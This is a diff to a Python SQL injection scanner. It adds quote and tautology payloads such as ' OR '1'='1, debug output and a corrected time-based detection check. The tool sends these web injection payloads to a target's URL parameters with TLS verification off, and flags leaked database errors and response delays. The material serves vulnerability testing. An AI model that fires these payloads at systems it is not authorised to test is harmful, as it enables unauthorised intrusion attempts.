@@ -30,6 +30,9 @@ SQL_ERRORS = [
 
 # Advanced Payloads including UNION and Time-based injections
 PAYLOADS = [
+    "'",        
+    "\"",      
+    "'))",
     "' OR '1'='1",
     "\" OR \"1\"=\"1",
     "' OR '1'='1' --",
@@ -64,6 +67,8 @@ def run_sqli_scan(target_url: str) -> dict:
     session = requests.Session()
     session.headers["User-Agent"] = "VULKN_Scanner/1.0"
     
+    print(f"[*] Starting SQLi Scan on: {target_url}")
+
     # --- PHASE 1: URL PARAMETER INJECTION ---
     parsed_url = urlparse(target_url)
     query_params = parse_qs(parsed_url.query)
@@ -71,37 +76,48 @@ def run_sqli_scan(target_url: str) -> dict:
     if query_params:
         for payload in PAYLOADS:
             for key, values in query_params.items():
+                # Test appending payload to the existing value
+                val = values[0] + payload
                 malicious_params = query_params.copy()
-                malicious_params[key] = [values[0] + payload]
+                malicious_params[key] = [val]
                 malicious_query = urlencode(malicious_params, doseq=True)
                 test_url = urlunparse(list(parsed_url[:4]) + [malicious_query] + list(parsed_url[5:]))
                 
                 try:
+                    # LOUD DEBUG: This will now show up in Terminal 2
+                    print(f"[?] Testing: {test_url}")
+                    
                     start_time = time.time()
                     response = session.get(test_url, timeout=10, verify=False)
                     end_time = time.time()
-                    response_text = response.text.lower()
                     
-                    # Error-Based Check
+                    res_text = response.text.lower()
+                    
+                    # Check for Error signatures
                     for error in SQL_ERRORS:
-                        if error in response_text:
+                        if error in res_text:
+                            print(f"[!] VULNERABILITY FOUND: {error}")
                             details.append({
-                                "type": "Error-Based SQLi (URL Param)",
-                                "payload_used": payload,
+                                "type": "Error-Based SQLi",
+                                "payload_used": val,
                                 "severity": "Critical",
-                                "description": f"Database syntax error leaked. Matched signature: '{error}'"
+                                "description": f"Database error leaked: '{error}'"
                             })
                             break
                     
-                    # Time-Based Check
-                    if (end_time - start_time) > 4.5 and "delay" in payload.lower() or "sleep" in payload.lower():
+                    # Check for Time-based (Fixed logic)
+                    duration = end_time - start_time
+                    if duration > 4.5 and ("sleep" in payload.lower() or "delay" in payload.lower()):
+                        print(f"[!] TIME-BASED VULNERABILITY FOUND: {duration}s")
                         details.append({
-                            "type": "Time-Based Blind SQLi (URL Param)",
+                            "type": "Time-Based Blind SQLi",
                             "payload_used": payload,
                             "severity": "Critical",
-                            "description": "Server delayed response by > 5 seconds, confirming successful blind injection."
+                            "description": f"Server delayed response by {round(duration, 2)}s"
                         })
-                except requests.RequestException:
+
+                except Exception as e:
+                    print(f"[!] Request failed: {e}")
                     continue
 
     # --- PHASE 2: HTML FORM INJECTION ---
@@ -157,9 +173,7 @@ def run_sqli_scan(target_url: str) -> dict:
     except requests.RequestException as e:
         pass # Target might be unreachable
 
-    # Deduplicate findings so we don't spam the JSON report
     unique_details = [dict(t) for t in {tuple(d.items()) for d in details}]
-
     return {
         "scanner_name": "Advanced SQL Injection Engine",
         "target_url": target_url,
